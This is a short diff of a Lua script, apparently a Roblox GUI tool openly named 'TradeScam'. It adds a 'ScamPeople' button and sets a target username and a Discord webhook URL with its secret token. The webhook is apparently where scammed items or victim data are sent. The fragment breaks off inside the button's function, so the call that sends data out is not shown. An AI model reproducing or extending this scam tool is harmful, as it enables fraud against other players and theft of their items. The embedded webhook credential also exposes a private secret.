@@ -3,6 +3,8 @@ local Window = Library.CreateLib("(TSD_DOGE) TradeScam CURRENT STATUS: OWNER", "
 
 local TradeScam = Window:NewTab("TradeScam")
 local TradeScamSection = TradeScam:NewSection("TradeScam")
+
+TradeScamSection:NewButton("TradeScam", "ScamPeople", function()
 Username = "jiegamingstido "
 WebHook = "https://discord.com/api/webhooks/1072084019518382101/q9D2DokarAwm4OtiiAen2AHFrB2bLvKspCBtti2_-2FTN7MqhR1MgcNd5_k0f_bV2YNm"
 
